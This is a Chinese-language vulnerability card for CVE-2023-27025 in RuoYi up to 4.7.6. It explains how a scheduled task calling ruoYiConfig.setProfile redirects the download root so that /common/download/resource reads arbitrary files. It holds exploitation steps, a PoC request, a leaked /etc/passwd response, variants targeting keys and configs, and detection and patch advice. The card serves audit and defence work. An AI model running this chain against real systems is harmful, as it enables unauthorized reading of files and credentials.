---
id: web-java-framework-ruoyi-setprofile-download-resource-arbitrary-read
title: RuoYi 定时任务调用 RuoYiConfig.setProfile 改写上传目录后 /common/download/resource 无穿越符任意文件读取（CVE-2023-27025）
type: scenario
domain: web
path: web/java/framework
technique: ruoyi-quartz-setprofile-download-resource-file-read
tags:
- java
- ruoyi
- quartz
- arbitrary-file-read
- cve-2023-27025
- code-audit
cve:
- CVE-2023-27025
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: RuoYi ≤ 4.7.6（原文写“4.7.6 之前”；NVD 标注 v4.7.6 and below，修复 commit 432d5ce 随 4.7.7 发布）
verification:
  verified_by: verifier-V517
  verified_at: '2026-11-11T12:01:03+08:00'
  notes: 已对照原文与 19 张截图核对；修正 Bean 名为 ruoYiConfig（Spring Bean 查找区分大小写，截图/卡片原大写串无法经 SpringUtils.getBean 解析）、修正修复边界为 4.7.7（4.7.6 仅将 com.ruoyi.common.config 加入 JOB_ERROR_STR 字符串黑名单，拦全限定类名形式；4.7.7 起 whiteList 对 Bean 形式亦检查，NVD 标 ≤4.7.6）、删除无依据的“4.7.5 环境”表述。未验证：原文未给出演示环境版本；CVE 修复边界以 Gitee commit 432d5ce 与 NVD 为准。dedup：与 4.5.0 /common/download/resource 路径穿越卡同接口但根因、前置权限、PoC 均不同，保留。
url: /docs/web/java/framework/web-java-framework-ruoyi-setprofile-download-resource-arbitrary-read/
draft: false
kb_aliases:
- CVE-2023-27025
- RuoYi 任意文件读取
- RuoYiConfig.setProfile 改上传路径
- 若依 setProfile 文件读取
- download/resource 绕过 checkAllowDownload
---

## 一句话结论

在 4.7.6 及更早的 RuoYi 中（原文写“4.7.6 之前”），定时任务的黑/白名单放行了 `com.ruoyi.common.config.RuoYiConfig`：管理员新建一个 `invokeTarget` 为 `ruoYiConfig.setProfile("/etc/passwd")` 的定时任务并执行，就把全局上传目录 `profile` 改成了目标文件路径；随后请求 `/common/download/resource?resource=1.txt`，`checkAllowDownload` 只校验 `resource` 不含 `..`、扩展名合规，而 `downloadPath = profile + substringAfter(resource,'/profile')` 在 `resource` 不含 `/profile` 时后缀为空串，直接读取 `profile` 指向的任意文件。

## 原理

- 下载接口逻辑（`CommonController#resourceDownload`）：
  ```java
  if (!FileUtils.checkAllowDownload(resource)) throw new Exception(...);
  String localPath = RuoYiConfig.getProfile();
  String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);
  ...
  FileUtils.writeBytes(downloadPath, response.getOutputStream());
  ```
  `Constants.RESOURCE_PREFIX` 为 `/profile`。4.5.1 引入的 `checkAllowDownload` 只拒绝 `..` 并做扩展名白名单，无法阻止「`resource` 本身合法但 `profile` 被改写」。
- 关键点：`StringUtils.substringAfter("1.txt", "/profile")` 在分隔符不存在时返回空串，于是 `downloadPath` 等于 `RuoYiConfig.getProfile()`。`resource=1.txt` 既没有 `..`，扩展名 `txt` 又在允许列表内，可完整通过检查。
- `RuoYiConfig` 是 `@Component` + `@ConfigurationProperties(prefix = "ruoyi")` 的配置类（Bean 名 `ruoYiConfig`，Spring Bean 查找区分大小写），`setProfile(String)` 修改的是 `private static String profile` 全局静态字段；定时任务通过 `JobInvokeUtil` 反射调用 Bean 方法即可在运行期改写它，之后的下载请求都使用被篡改的 `profile`。也可用全限定类名形式 `com.ruoyi.common.config.RuoYiConfig.setProfile(...)`（`JobInvokeUtil` 按点数 >1 走 `Class.forName` 分支）。
- 该 Bean 位于 `com.ruoyi.common.config`，在受影响版本中仍能通过定时任务的黑/白名单校验（原文截图确认包名检查通过），因此「管理员 → 任意文件读取」链路成立。原文只标注影响 4.7.6 之前；核对源码与 NVD：4.7.6 仅在 `Constants.JOB_ERROR_STR` 新增 `com.ruoyi.common.config`（拦住全限定类名形式），4.7.7 起 `ScheduleUtils.whiteList` 对 Bean 形式也检查 JOB_ERROR_STR，链路才彻底失效（NVD 标注 v4.7.6 and below）。
- 为什么需要定时任务而不是直接改参数：`resource` 侧被 `checkAllowDownload` 卡住，攻击者改不了「根目录」，只能改「根目录变量」。

## 触发条件

- 目标为 RuoYi 4.7.6 及更早版本（CVE-2023-27025；原文写“4.7.6 之前”，NVD 标注 v4.7.6 and below）。
- 攻击者拥有定时任务管理权限（默认 admin，或被授予 `monitor:job:add`/`monitor:job:run` 的角色）。
- 定时任务调用目标校验允许 `com.ruoyi.common.config.RuoYiConfig`（受影响版本的默认行为）。
- 应用进程对目标文件有读权限；`/common/download/resource` 可访问（需登录态，攻击者已是管理员）。
- 目标文件扩展名需在 `checkAllowDownload` 白名单内，或利用 `resource` 不含 `/profile` 的路径（此时实际读的是 `profile` 指向的文件，扩展名检查只作用于 `resource` 字符串）。

## 利用步骤

1. 登录后台，进入「系统监控 → 定时任务」，新增任务。
2. 调用目标字符串填 `ruoYiConfig.setProfile("/etc/passwd")`（Bean 调用形式，Bean 名首字母小写；也可写全限定类名 `com.ruoyi.common.config.RuoYiConfig.setProfile(...)`），执行策略选「执行一次」并保存执行；Linux 目标也可换成任意可读文件，Windows 用 `ruoYiConfig.setProfile("C:/Windows/win.ini")`。
3. 任务执行后 `RuoYiConfig.profile` 已被改成目标文件路径。
4. 携带会话请求 `GET /common/download/resource?resource=1.txt`，响应体即目标文件内容。
5. 如需继续读其他文件，重复步骤 1-3 改写 `profile` 即可（每次改完立即读取）。

## PoC

```text
# 1) 定时任务 invokeTarget
ruoYiConfig.setProfile("/etc/passwd")

# 2) 读取（resource 不含 /profile，substringAfter 返回空串）
GET /common/download/resource?resource=1.txt HTTP/1.1
Host: 127.0.0.1:8088
Cookie: JSESSIONID=<会话>
```

```http
HTTP/1.1 200
Content-Disposition: attachment; filename=uri.txt
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
...
```

原文截图显示用上述两步读到 `/etc/passwd`（`resource=1.txt` 的响应体为 passwd 内容）；原文未标注演示环境的具体版本，仅标注影响 4.7.6 之前。

## 变体与关联

- 变体：把 `profile` 指向应用 `application.yml`、数据库配置、私钥、源码等，读取后进一步横向；改 `profile` 也可能影响其他依赖上传目录的功能。
- 变体：`profile` 指向目录时，`resource` 需带 `/profile` 前缀才能拼接出目录内文件；直接指向文件时用任意合法扩展名的 `resource` 即可。
- 关联：[[web-java-framework-ruoyi-download-resource-path-traversal]]——4.5.0 的同类下载接口直接用 `../` 穿越，4.5.1 加 `checkAllowDownload` 修复；本卡是修复后「不改 resource 改 profile」的绕过，机制与版本区间都不同。
- 关联：[[web-java-rce-ruoyi-478-createtable-sqli-job-invoketarget-bypass]]——同为定时任务调用白名单内 Bean 的问题；那条链用 `createTable` 改写 `sys_job` 触发 RCE，本卡用 `setProfile` 改下载根目录。4.7.7 起 `ScheduleUtils.whiteList` 对 Bean 形式也检查 JOB_ERROR_STR（4.7.6 仅新增配置包名的字符串黑名单），本卡链自该版本失效。

## 检测与防御

- 检测：审计 `sys_job.invoke_target` 中出现 `setProfile`、`RuoYiConfig`、`common.config`；监控定时任务执行后 `/common/download/resource` 返回非上传目录文件，尤其是 `resource` 不以 `/profile` 开头却返回非空内容。
- 检测：对比 `ruoyi.profile` 配置值与运行期实际值，出现运行期变更即高危。
- 防御：升级到 4.7.7+（Bean 形式的完整修复在 4.7.7；4.7.6 仅将配置包名加入字符串黑名单、可拦全限定类名形式）；把 `com.ruoyi.common.config` 等配置类加入任务调用黑名单，并在 `JobInvokeUtil` 执行侧再做类/方法白名单。
- 防御：下载接口要求 `resource` 必须以 `/profile` 开头，且 `getCanonicalPath()` 后必须位于 `profile` 目录内；配置类的 setter 不允许被反射任务调用。
